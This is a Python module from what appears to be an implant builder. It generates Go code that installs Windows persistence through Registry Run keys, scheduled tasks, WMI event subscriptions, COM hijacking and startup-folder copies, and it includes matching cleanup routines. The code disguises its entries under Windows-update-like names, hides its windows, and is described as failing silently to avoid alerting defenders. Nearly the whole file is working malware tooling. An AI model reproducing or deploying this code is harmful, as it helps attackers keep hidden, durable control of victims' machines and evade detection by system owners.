# persistence module
"""Persistence mechanisms for Windows implants.

This module provides functions to inject persistence code into Go templates,
including registry Run keys, scheduled tasks, WMI event subscriptions,
and COM hijacking techniques.
All persistence functions are designed to fail silently to avoid alerting defenders.

References:
- MITRE ATT&CK T1547.001 (Registry Run Keys / Startup Folder)
- MITRE ATT&CK T1053.005 (Scheduled Task)
- MITRE ATT&CK T1546.003 (WMI Event Subscription)
- MITRE ATT&CK T1546.015 (COM Hijacking)
"""

from pathlib import Path
from typing import Any


# Default snippets directory relative to project root
SNIPPETS_DIR = Path(__file__).parent.parent / "snippets"


class PersistenceError(Exception):
    """Base exception for persistence module errors."""

    pass


class SnippetNotFoundError(PersistenceError):
    """Raised when a snippet file cannot be found."""

    pass


def load_snippet(snippet_name: str, snippets_dir: Path | None = None) -> str:
    """Load a Go snippet file from the snippets directory.

    Args:
        snippet_name: Name of the snippet file (with or without .go extension).
        snippets_dir: Optional custom snippets directory path.

    Returns:
        The snippet content as a string.

    Raises:
        SnippetNotFoundError: If the snippet file does not exist.
        PersistenceError: If the snippet cannot be read.
    """
    if snippets_dir is None:
        snippets_dir = SNIPPETS_DIR

    # Ensure .go extension
    if not snippet_name.endswith(".go"):
        snippet_name = f"{snippet_name}.go"

    snippet_path = snippets_dir / snippet_name

    if not snippet_path.exists():
        raise SnippetNotFoundError(f"Snippet not found: {snippet_path}")

    try:
        return snippet_path.read_text(encoding="utf-8")
    except OSError as e:
        raise PersistenceError(f"Failed to read snippet {snippet_path}: {e}") from e


def get_registry_persistence_code(
    key_path: str = r"Software\Microsoft\Windows\CurrentVersion\Run",
    value_name: str = "WindowsUpdate",
) -> str:
    """Get registry persistence code for Run keys.

    Creates a registry entry in the Run key to execute the implant on user login.
    Uses HKEY_CURRENT_USER by default to avoid requiring admin privileges.

    Reference: MITRE ATT&CK T1547.001 (Registry Run Keys / Startup Folder)

    Args:
        key_path: Registry key path (default: CurrentUser Run key).
        value_name: Name of the registry value to create.

    Returns:
        Go code string for registry persistence function.
    """
    # Escape backslashes for Go string
    escaped_key_path = key_path.replace("\\", "\\\\")
    return f'''
// installRegistryPersistence creates a Run key entry for persistence.
// Reference: MITRE ATT&CK T1547.001 (Registry Run Keys / Startup Folder)
func installRegistryPersistence() error {{
	exePath, err := os.Executable()
	if err != nil {{
		return err // Silent failure, continue execution
	}}

	// Open HKEY_CURRENT_USER\\{escaped_key_path}
	key, err := registry.OpenKey(registry.CURRENT_USER, `{escaped_key_path}`, registry.SET_VALUE)
	if err != nil {{
		return err
	}}
	defer key.Close()

	// Set the value to our executable path
	err = key.SetStringValue("{value_name}", exePath)
	if err != nil {{
		return err
	}}

	return nil
}}
'''


def get_schtasks_persistence_code(
    task_name: str = "WindowsUpdateCheck",
    trigger: str = "ONLOGON",
) -> str:
    """Get scheduled task persistence code.

    Creates a scheduled task using the Windows Task Scheduler to execute
    the implant on specified triggers (logon, startup, etc.).

    Reference: MITRE ATT&CK T1053.005 (Scheduled Task)

    Args:
        task_name: Name of the scheduled task to create.
        trigger: Task trigger type (ONLOGON, ONIDLE, etc.).

    Returns:
        Go code string for scheduled task persistence function.
    """
    return f'''
// installScheduledTaskPersistence creates a scheduled task for persistence.
// Reference: MITRE ATT&CK T1053.005 (Scheduled Task)
func installScheduledTaskPersistence() error {{
	exePath, err := os.Executable()
	if err != nil {{
		return err // Silent failure, continue execution
	}}

	// Build schtasks command
	// /SC {trigger} - trigger type
	// /TN {task_name} - task name
	// /TR <path> - task action (run our binary)
	// /F - force create (overwrite if exists)
	cmd := exec.Command(
		"schtasks.exe",
		"/Create",
		"/SC", "{trigger}",
		"/TN", "{task_name}",
		"/TR", exePath,
		"/F",
	)
	
	// Run silently with hidden window
	cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
	
	err = cmd.Run()
	if err != nil {{
		return err
	}}

	return nil
}}
'''


def get_wmi_persistence_code(
    event_name: str = "WindowsUpdateEventFilter",
    consumer_name: str = "WindowsUpdateEventConsumer",
) -> str:
    """Get WMI event subscription persistence code.

    Creates a WMI event subscription that triggers the implant on system events.
    Uses __EventFilter, CommandLineEventConsumer, and __FilterToConsumerBinding.

    Reference: MITRE ATT&CK T1546.003 (WMI Event Subscription)

    Args:
        event_name: Name of the WMI event filter.
        consumer_name: Name of the WMI event consumer.

    Returns:
        Go code string for WMI persistence function.
    """
    return f'''
// installWMIPersistence creates a WMI event subscription for persistence.
// Reference: MITRE ATT&CK T1546.003 (WMI Event Subscription)
func installWMIPersistence() error {{
	exePath, err := os.Executable()
	if err != nil {{
		return err // Silent failure, continue execution
	}}

	// Escape path for WMI
	escapedPath := strings.ReplaceAll(exePath, `\\`, `\\\\`)

	// Create WMI Event Filter - triggers on system startup
	filterQuery := `SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325`
	
	filterCmd := fmt.Sprintf(
		`powershell.exe -WindowStyle Hidden -Command "$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name='%s';EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query='%s'}}"`,
		"{event_name}",
		filterQuery,
	)

	// Create CommandLineEventConsumer
	consumerCmd := fmt.Sprintf(
		`powershell.exe -WindowStyle Hidden -Command "$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name='%s';CommandLineTemplate='%s'}}"`,
		"{consumer_name}",
		escapedPath,
	)

	// Create FilterToConsumerBinding
	bindingCmd := fmt.Sprintf(
		`powershell.exe -WindowStyle Hidden -Command "$Binding = Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$Filter;Consumer=$Consumer}}"`,
	)

	// Execute commands silently
	for _, cmdStr := range []string{{filterCmd, consumerCmd, bindingCmd}} {{
		cmd := exec.Command("cmd.exe", "/c", cmdStr)
		cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
		err := cmd.Run()
		if err != nil {{
			return err
		}}
	}}

	return nil
}}
'''


def get_com_hijack_code(
    clsid: str = "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}",
    description: str = "Thumbcache",
) -> str:
    """Get COM hijacking persistence code.

    Creates a registry entry to hijack a COM object CLSID, redirecting
    it to our implant DLL or executable.

    Reference: MITRE ATT&CK T1546.015 (COM Hijacking)

    Args:
        clsid: The CLSID to hijack (default: common benign CLSID).
        description: Description for the hijacked COM object.

    Returns:
        Go code string for COM hijacking persistence function.
    """
    return f'''
// installCOMHijackPersistence hijacks a COM object for persistence.
// Reference: MITRE ATT&CK T1546.015 (COM Hijacking)
func installCOMHijackPersistence() error {{
	exePath, err := os.Executable()
	if err != nil {{
		return err // Silent failure, continue execution
	}}

	// COM hijacking via HKCU\\Software\\Classes\\CLSID
	// This takes precedence over HKLM entries
	clsid := "{clsid}"
	keyPath := `Software\\Classes\\CLSID\\` + clsid + `\\InprocServer32`

	// Create the key path
	key, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {{
		return err
	}}
	defer key.Close()

	// Set the default value to our executable
	err = key.SetStringValue("", exePath)
	if err != nil {{
		return err
	}}

	// Set ThreadingModel (required for COM)
	err = key.SetStringValue("ThreadingModel", "Both")
	if err != nil {{
		return err
	}}

	return nil
}}
'''


def get_startup_folder_code() -> str:
    """Get startup folder persistence code.

    Creates a shortcut (.lnk) file in the user's Startup folder.
    This is a simpler alternative to registry-based persistence.

    Reference: MITRE ATT&CK T1547.001 (Registry Run Keys / Startup Folder)

    Returns:
        Go code string for startup folder persistence function.
    """
    return '''
// installStartupFolderPersistence creates a shortcut in the Startup folder.
// Reference: MITRE ATT&CK T1547.001 (Registry Run Keys / Startup Folder)
func installStartupFolderPersistence() error {
	exePath, err := os.Executable()
	if err != nil {
		return err // Silent failure, continue execution
	}

	// Get the Startup folder path
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return fmt.Errorf("APPDATA not set")
	}
	
	startupPath := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	
	// Copy executable to Startup folder with innocuous name
	destPath := filepath.Join(startupPath, "WindowsHelper.exe")
	
	// Read source file
	sourceFile, err := os.ReadFile(exePath)
	if err != nil {
		return err
	}
	
	// Write to destination
	err = os.WriteFile(destPath, sourceFile, 0755)
	if err != nil {
		return err
	}

	return nil
}
'''


def get_persistence_imports() -> str:
    """Get required imports for persistence functions.

    Returns:
        Go import statements needed for persistence code.
    """
    return '''"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"golang.org/x/sys/windows/registry"'''


def get_persistence_calls(config: dict[str, Any]) -> str:
    """Get persistence function calls for template injection.

    Generates the appropriate function calls based on config settings.

    Args:
        config: Persistence configuration dictionary with keys:
            - methods: list of persistence methods to use

    Returns:
        Go code string with persistence function calls.
    """
    calls = []
    methods = config.get("methods", [])

    method_to_func = {
        "registry": "installRegistryPersistence()",
        "schtasks": "installScheduledTaskPersistence()",
        "wmi": "installWMIPersistence()",
        "com_hijack": "installCOMHijackPersistence()",
        "startup_folder": "installStartupFolderPersistence()",
    }

    for method in methods:
        if method in method_to_func:
            calls.append(f"\t{method_to_func[method]}")

    return "\n".join(calls)


def build_persistence_functions(config: dict[str, Any]) -> str:
    """Build all persistence functions based on configuration.

    Combines all enabled persistence techniques into a single code block
    for injection into templates.

    Args:
        config: Persistence configuration dictionary with keys:
            - methods: list of persistence methods to use
            - registry_key_path: optional custom registry key path
            - registry_value_name: optional custom registry value name
            - task_name: optional custom scheduled task name
            - wmi_event_name: optional custom WMI event filter name
            - com_clsid: optional custom CLSID to hijack

    Returns:
        Go code string containing all enabled persistence functions.
    """
    functions = []
    methods = config.get("methods", [])

    if "registry" in methods:
        key_path = config.get(
            "registry_key_path",
            r"Software\Microsoft\Windows\CurrentVersion\Run"
        )
        value_name = config.get("registry_value_name", "WindowsUpdate")
        functions.append(get_registry_persistence_code(key_path, value_name))

    if "schtasks" in methods:
        task_name = config.get("task_name", "WindowsUpdateCheck")
        trigger = config.get("task_trigger", "ONLOGON")
        functions.append(get_schtasks_persistence_code(task_name, trigger))

    if "wmi" in methods:
        event_name = config.get("wmi_event_name", "WindowsUpdateEventFilter")
        consumer_name = config.get("wmi_consumer_name", "WindowsUpdateEventConsumer")
        functions.append(get_wmi_persistence_code(event_name, consumer_name))

    if "com_hijack" in methods:
        clsid = config.get("com_clsid", "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}")
        functions.append(get_com_hijack_code(clsid))

    if "startup_folder" in methods:
        functions.append(get_startup_folder_code())

    return "\n".join(functions)


def inject_persistence(template: str, config: dict[str, Any]) -> str:
    """Inject persistence code into a Go template.

    Replaces {{PERSISTENCE_FUNCTIONS}} and related placeholders
    with the appropriate persistence code based on configuration.

    Args:
        template: The Go template string with placeholders.
        config: Persistence configuration dictionary. Expected structure:
            {
                "enabled": bool,
                "methods": list[str],  # ["registry", "schtasks", "wmi", "com_hijack"]
                "registry_key_path": str (optional),
                "registry_value_name": str (optional),
                "task_name": str (optional),
                "wmi_event_name": str (optional),
                "com_clsid": str (optional)
            }

    Returns:
        The template with persistence code injected.

    Example:
        >>> config = {"enabled": True, "methods": ["registry", "schtasks"]}
        >>> result = inject_persistence(template, config)
    """
    # Check if persistence is enabled
    if not config.get("enabled", False):
        # Remove placeholders but don't inject code
        result = template.replace("{{PERSISTENCE_FUNCTIONS}}", "")
        result = result.replace("{{PERSISTENCE_IMPORTS}}", "")
        return result

    # Build persistence components
    persistence_functions = build_persistence_functions(config)
    persistence_imports = get_persistence_imports() if config.get("methods") else ""
    persistence_calls = get_persistence_calls(config)

    # Replace placeholders
    result = template

    # Handle {{PERSISTENCE_FUNCTIONS}} placeholder for function calls
    if "{{PERSISTENCE_FUNCTIONS}}" in result:
        result = result.replace("{{PERSISTENCE_FUNCTIONS}}", persistence_calls)

    # Handle {{PERSISTENCE_IMPORTS}} if present
    if "{{PERSISTENCE_IMPORTS}}" in result:
        result = result.replace("{{PERSISTENCE_IMPORTS}}", persistence_imports)

    # Append function definitions before the main() function
    if persistence_functions and "func main()" in result:
        result = result.replace(
            "func main()",
            f"{persistence_functions}\n\nfunc main()"
        )

    return result


def _needs_persistence_imports(config: dict[str, Any]) -> bool:
    """Check if persistence imports are needed based on config.

    Args:
        config: Persistence configuration dictionary.

    Returns:
        True if any persistence technique requiring imports is enabled.
    """
    if not config.get("enabled", False):
        return False
    return bool(config.get("methods", []))


def get_available_persistence_methods() -> dict[str, str]:
    """Get dictionary of available persistence methods and descriptions.

    Returns:
        Dictionary mapping method names to descriptions.
    """
    return {
        "registry": "Creates Run key entry in HKCU (T1547.001)",
        "schtasks": "Creates scheduled task for logon persistence (T1053.005)",
        "wmi": "Creates WMI event subscription persistence (T1546.003)",
        "com_hijack": "Hijacks COM object CLSID for persistence (T1546.015)",
        "startup_folder": "Copies to user Startup folder (T1547.001)",
    }


def remove_persistence(method: str) -> str:
    """Get code to remove a specific persistence mechanism.

    Useful for cleanup or stealth operations.

    Args:
        method: The persistence method to remove.

    Returns:
        Go code string to remove the persistence.

    Raises:
        ValueError: If method is not recognized.
    """
    removal_code = {
        "registry": '''
// removeRegistryPersistence removes the Run key entry.
func removeRegistryPersistence() error {
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\\Microsoft\\Windows\\CurrentVersion\\Run`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()
	
	return key.DeleteValue("WindowsUpdate")
}
''',
        "schtasks": '''
// removeScheduledTaskPersistence removes the scheduled task.
func removeScheduledTaskPersistence() error {
	cmd := exec.Command("schtasks.exe", "/Delete", "/TN", "WindowsUpdateCheck", "/F")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}
''',
        "wmi": '''
// removeWMIPersistence removes WMI event subscription.
func removeWMIPersistence() error {
	cmd := exec.Command("powershell.exe", "-WindowStyle", "Hidden", "-Command",
		`Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "Name='WindowsUpdateEventFilter'" | Remove-WmiObject;` +
		`Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateEventConsumer'" | Remove-WmiObject;` +
		`Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like '*WindowsUpdateEventFilter*'} | Remove-WmiObject`)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}
''',
        "com_hijack": '''
// removeCOMHijackPersistence removes the COM hijack registry entries.
func removeCOMHijackPersistence() error {
	clsid := "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
	keyPath := `Software\\Classes\\CLSID\\` + clsid
	return registry.DeleteKey(registry.CURRENT_USER, keyPath)
}
''',
        "startup_folder": '''
// removeStartupFolderPersistence removes the startup folder entry.
func removeStartupFolderPersistence() error {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return fmt.Errorf("APPDATA not set")
	}
	startupPath := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsHelper.exe")
	return os.Remove(startupPath)
}
''',
    }

    if method not in removal_code:
        raise ValueError(f"Unknown persistence method: {method}. Available: {list(removal_code.keys())}")

    return removal_code[method]
